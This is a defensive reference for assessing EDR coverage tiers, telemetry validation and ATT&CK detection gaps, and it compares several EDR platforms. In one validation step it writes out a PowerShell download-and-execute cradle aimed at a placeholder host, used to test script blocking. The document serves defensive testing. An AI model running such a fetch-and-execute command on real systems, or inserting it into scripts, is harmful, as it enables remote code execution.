# EDR Deployment — Reference

Use during Phase 1 to assess EDR coverage, telemetry quality, and ATT&CK detection gaps.

## Coverage Tiers

| Tier | Definition | Target | Assessment Method |
|------|-----------|--------|------------------|
| Tier 1 — Full Telemetry | EDR agent installed, policy active, telemetry flowing to SIEM | 100% of Tier 1/2 assets | Agent inventory vs CMDB |
| Tier 2 — Agent Installed | Agent installed but policy gaps (no memory scan, no script blocking) | Identify and remediate | Policy audit in EDR console |
| Tier 3 — Excluded | Asset excluded from EDR (often OT, legacy, performance concerns) | Document with compensating controls | Exception register |
| Tier 4 — Not Covered | No EDR agent; no compensating control | Must remediate | Gap register |

## Telemetry Validation Steps

1. Verify agent check-in times — flag assets with last-seen > 24 hours
2. Confirm policy assignment — ensure prevention + detection policies applied
3. Test telemetry flow — run EICAR test on each OS type and verify alert in SIEM within 5 minutes
4. Validate process creation logging — confirm `sysmon` event ID 1 or EDR equivalent flowing
5. Confirm network telemetry — verify DNS request and network connection events
6. Test script execution blocking — run `IEX (New-Object Net.WebClient).DownloadString('http://test')` in test environment

## ATT&CK Detection Coverage Matrix

| ATT&CK Tactic | Key Techniques | EDR Telemetry Required | Coverage Status |
|---------------|---------------|----------------------|----------------|
| Execution | T1059 (all sub-techniques) | Process creation, command line, script engine events | Assess per EDR platform |
| Persistence | T1547, T1053, T1543 | Registry modifications, scheduled task creation, service install | Assess |
| Credential Access | T1003.001 LSASS, T1555, T1558 | Memory access to LSASS, credential manager access | Assess |
| Defence Evasion | T1055 Process Injection, T1562 | Process hollowing indicators, security tool tampering | Assess |
| Lateral Movement | T1021.002 SMB, T1021.006 WinRM | Remote service execution, admin share access | Assess |
| Exfiltration | T1048, T1041 | Network connections from sensitive processes | Assess |

## EDR Platform Comparison Notes

| Feature | CrowdStrike Falcon | Microsoft Defender for Endpoint | SentinelOne |
|---------|--------------------|--------------------------------|-------------|
| Memory scan | Yes | Yes | Yes |
| Fileless threat detection | Yes (via behaviours) | Yes | Yes |
| Network telemetry | Yes | Yes | Yes |
| ATT&CK mapping | Yes (Fusion SOAR) | Yes (Threat analytics) | Yes (STAR) |
| macOS/Linux support | Yes | Yes | Yes |
